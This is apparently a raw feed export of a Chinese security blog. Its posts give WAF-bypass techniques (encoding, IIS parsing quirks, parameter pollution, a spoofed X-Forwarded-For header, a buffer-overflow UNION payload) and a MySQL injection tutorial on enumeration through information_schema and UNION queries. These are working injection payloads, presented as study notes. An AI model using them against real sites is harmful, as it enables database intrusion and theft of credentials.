class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">= -&gt; %3D -&gt;%25%33%44</span><br><span class="line"></span><br><span class="line">and 1=1 -&gt; YW5kIDE9MQ==</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h3><ol><li>iis</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select</span><br><span class="line">iis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select</span><br><span class="line"></span><br><span class="line">    +--------------------------------------------------------------------+</span><br><span class="line">    |   Keywords     |        WAF             |  ASP/ASP.NET             |</span><br><span class="line">    +--------------------------------------------------------------------+</span><br><span class="line">    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |</span><br><span class="line">    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |</span><br><span class="line">    | &lt;scr%ipt&gt;      | &lt;scr%ipt&gt;                  | &lt;script&gt;             |</span><br><span class="line">    | &lt;if%rame&gt;      | &lt;if%rame&gt;                  | &lt;iframe&gt;             |</span><br><span class="line">    +--------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>hpp</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php+apache    &amp;id=1&amp;id=2     他只解析最后一个</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| Web Server      | Parameter Interpretation         | Example     |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| ASP/IIS         | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| PHP/Apache      | The last param is resulting  | par1=val2       |</span><br><span class="line">| JSP/Tomcat      | The first param is resulting | par1=val1       |</span><br><span class="line">| Perl/Apache     | The first param is resulting | par1=val1       |</span><br><span class="line">| DBMan           | Concatenation by two tildes  | par1=val1~~val2 |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>HTTP Parameter Contamination</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| Query String    |    Web Servers response / GET values    |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| ?test[1=2       | test_1=2             | test[1=2         |</span><br><span class="line">| ?test=%         | test=%               | test=            |</span><br><span class="line">| ?test%00=1      | test=1               | test=1           |</span><br><span class="line">| ?test=1%001     | NULL                 | test=1           |</span><br><span class="line">| ?test+d=1+2     | test_d=1 2           | test d=1 2       |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>有的程序他会对本地ip不拦截，同时他的host使用<code>X-Forwarded-For</code> 等来获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="缓冲溢出"><a href="#缓冲溢出" class="headerlink" title="缓冲溢出"></a>缓冲溢出</h3><p>waf他处理数据包的大小有限，早期安全狗你提交过长url会直接奔溃</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL 注入 ？？？？</title>
      <link href="/josyaaa/2022/05/12/MYSQL-SQL/"/>
      <url>/josyaaa/2022/05/12/MYSQL-SQL/</url>
      
        <content type="html"><![CDATA[<p>建立数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database mysqltest;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查询所有数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| mysqltest          |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用数据库 新建一个表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysqltest</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table admin (id int,username varchar(255),password varchar(255));</span><br><span class="line">Query OK, 0 rows affected (0.09 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看数据库，插入，与查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------+</span><br><span class="line">| Tables_in_mysqltest |</span><br><span class="line">+---------------------+</span><br><span class="line">| admin               |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into admin (id,username,password) values (1,&quot;admin&quot;,&quot;admin&quot;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查询 where 语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id =1;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><p>information_schema是用于存储数据库元数据的表，保存数据库名，表名，列名等信息，从爆破表名可以直接查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| CHARACTER_SETS                        |</span><br><span class="line">| COLLATIONS                            |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">| COLUMN_PRIVILEGES                     |</span><br><span class="line">| ENGINES                               |</span><br><span class="line">| EVENTS                                |</span><br><span class="line">| FILES                                 |</span><br><span class="line">| GLOBAL_STATUS                         |</span><br><span class="line">| GLOBAL_VARIABLES                      |</span><br><span class="line">| KEY_COLUMN_USAGE                      |</span><br><span class="line">| OPTIMIZER_TRACE                       |</span><br><span class="line">| PARAMETERS                            |</span><br><span class="line">| PARTITIONS                            |</span><br><span class="line">| PLUGINS                               |</span><br><span class="line">| PROCESSLIST                           |</span><br><span class="line">| PROFILING                             |</span><br><span class="line">| REFERENTIAL_CONSTRAINTS               |</span><br><span class="line">| ROUTINES                              |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| SCHEMA_PRIVILEGES                     |</span><br><span class="line">| SESSION_STATUS                        |</span><br><span class="line">| SESSION_VARIABLES                     |</span><br><span class="line">| STATISTICS                            |</span><br><span class="line">| TABLES                                |</span><br><span class="line">| TABLESPACES                           |</span><br><span class="line">| TABLE_CONSTRAINTS                     |</span><br><span class="line">| TABLE_PRIVILEGES                      |</span><br><span class="line">| TRIGGERS                              |</span><br><span class="line">| USER_PRIVILEGES                       |</span><br><span class="line">| VIEWS                                 |</span><br><span class="line">| INNODB_LOCKS                          |</span><br><span class="line">| INNODB_TRX                            |</span><br><span class="line">| INNODB_SYS_DATAFILES                  |</span><br><span class="line">| INNODB_LOCK_WAITS                     |</span><br><span class="line">| INNODB_SYS_TABLESTATS                 |</span><br><span class="line">| INNODB_CMP                            |</span><br><span class="line">| INNODB_METRICS                        |</span><br><span class="line">| INNODB_CMP_RESET                      |</span><br><span class="line">| INNODB_CMP_PER_INDEX                  |</span><br><span class="line">| INNODB_CMPMEM_RESET                   |</span><br><span class="line">| INNODB_FT_DELETED                     |</span><br><span class="line">| INNODB_BUFFER_PAGE_LRU                |</span><br><span class="line">| INNODB_SYS_FOREIGN                    |</span><br><span class="line">| INNODB_SYS_COLUMNS                    |</span><br><span class="line">| INNODB_SYS_INDEXES                    |</span><br><span class="line">| INNODB_FT_DEFAULT_STOPWORD            |</span><br><span class="line">| INNODB_SYS_FIELDS                     |</span><br><span class="line">| INNODB_CMP_PER_INDEX_RESET            |</span><br><span class="line">| INNODB_BUFFER_PAGE                    |</span><br><span class="line">| INNODB_CMPMEM                         |</span><br><span class="line">| INNODB_FT_INDEX_TABLE                 |</span><br><span class="line">| INNODB_FT_BEING_DELETED               |</span><br><span class="line">| INNODB_SYS_TABLESPACES                |</span><br><span class="line">| INNODB_FT_INDEX_CACHE                 |</span><br><span class="line">| INNODB_SYS_FOREIGN_COLS               |</span><br><span class="line">| INNODB_SYS_TABLES                     |</span><br><span class="line">| INNODB_BUFFER_POOL_STATS              |</span><br><span class="line">| INNODB_FT_CONFIG                      |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">59 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常用:</p><ol><li>SCHEMATA表 ： 提供了当前mysql实例中所有数据库的信息。</li><li>TABLES 表 ： 提供了关于数据库中的表的信息。</li><li>COLUMNS 表 ：提供了表中的列信息</li></ol><p>SCHEMATA:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.schemata;</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |</span><br><span class="line">| def          | mysqltest          | latin1                     | latin1_swedish_ci      | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TABLES:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema=0x6D7973716C74657374;  //注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>COLUMNS：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name=0x61646D696E;  </span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>information_schema储存的是所有数据库的信息,If <code>mysqltest1</code> <code>mysqltest2</code> 都存在admin表的话 它都会显示出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name=0x61646D696E;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">| id          |</span><br><span class="line">| user        |</span><br><span class="line">| pass        |</span><br><span class="line">+-------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以要指定数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name=0x61646D696E and table_schema=0x6D7973716C74657374;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,password from user;</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">| user             | password                                  |</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| debian-sys-maint | *764E40048679D21BBB07CB8DDD18465359DAB4CA |</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id = &quot;1&quot;;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;</span><br><span class="line">&quot;&quot;</span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line">\</span><br><span class="line">\\</span><br><span class="line">``</span><br><span class="line">%</span><br></pre></td></tr></table></figure><p>such as :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from `admin` where id = &quot;1&quot;;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">/**/  /*/**/这样是等效于/**/</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">`</span><br><span class="line">/*!*/ 内列注释为什么放在这里呢，因为它也可以当作一个空格 /*!/*!*/是等效于/*!*/的</span><br></pre></td></tr></table></figure><h1 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a>操作符与逻辑操作符</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">:=</span><br><span class="line">||, OR, XOR</span><br><span class="line">&amp;&amp;, AND</span><br><span class="line">NOT</span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line">=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN</span><br><span class="line">|</span><br><span class="line">&amp;</span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line">-, +</span><br><span class="line">*, /, DIV, %, MOD</span><br><span class="line">^</span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line">!</span><br><span class="line">BINARY, COLLATE</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="注入产生"><a href="#注入产生" class="headerlink" title="注入产生"></a>注入产生</h1><ol><li>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据</li><li>过滤不严格</li><li>数据库配置不当</li><li>转义不当</li></ol><h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><p>数字型，字符型，搜索型,盲注等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = $id; //数字型 注入</span><br><span class="line"></span><br><span class="line">select * from admin where id = &#x27;$id&#x27;; //字符型</span><br><span class="line"></span><br><span class="line">select * from admin where id = &quot;$id&quot;;</span><br><span class="line"></span><br><span class="line">select * from admin where id = ($id);</span><br><span class="line"></span><br><span class="line">select * from admin where id = (&#x27;$id&#x27;);</span><br><span class="line"></span><br><span class="line">select * from admin where id = (&quot;$id&quot;);</span><br><span class="line"></span><br><span class="line">select * from admin where username  like &#x27;%adm%&#x27;;</span><br><span class="line"></span><br><span class="line">select * from admin where username  like (&#x27;%adm%&#x27;);</span><br><span class="line"></span><br><span class="line">select * from admin where id = $id limit 0,1;</span><br><span class="line"></span><br><span class="line">select * from admin order by $id;</span><br><span class="line"></span><br><span class="line">select * from admin order by limit 0,1 $id;</span><br><span class="line"></span><br><span class="line">select * from admin order by id limit 1,1 $id;</span><br><span class="line"></span><br><span class="line">insert注入</span><br><span class="line"></span><br><span class="line">update注入</span><br><span class="line"></span><br><span class="line">delete注入</span><br><span class="line"></span><br><span class="line">二次注入</span><br><span class="line"></span><br><span class="line">等等</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="注入注意"><a href="#注入注意" class="headerlink" title="注入注意"></a>注入注意</h1><p>黑盒测试建立在每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入，但凡涉及到用户交换地方都将是注入的重灾区</p><ol><li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li><li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li><li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li></ol><h1 id="收集与路径"><a href="#收集与路径" class="headerlink" title="收集与路径"></a>收集与路径</h1><p> <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p><p><code>/*!*/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,version(),3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | 5.6.30-1 | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,@@version,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | 5.6.30-1 | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,/*!40000 user()*/,3;</span><br><span class="line">+------+----------------+----------+</span><br><span class="line">| id   | username       | password |</span><br><span class="line">+------+----------------+----------+</span><br><span class="line">|    1 | admin          | admin    |</span><br><span class="line">|    1 | root@localhost | 3        |</span><br><span class="line">+------+----------------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>路径:<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p><h1 id="用户-链接信息"><a href="#用户-链接信息" class="headerlink" title="用户,链接信息"></a>用户,链接信息</h1><p><code>system_user() </code> &#x2F;&#x2F;系统用户名<br><code>user() </code>  &#x2F;&#x2F; 用户名<br><code>current_user()</code>  &#x2F;&#x2F;当前用户名<br><code>session_user()</code> &#x2F;&#x2F;链接数据库的用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id =1 union select system_user(),session_user(),current_user();</span><br><span class="line">+--------------------+--------------------+----------+</span><br><span class="line">| id                 | username           | password |</span><br><span class="line">+--------------------+--------------------+----------+</span><br><span class="line">| 1                  | Dumb               | Dumb     |</span><br><span class="line">| root@192.168.1.101 | root@192.168.1.101 | root@%   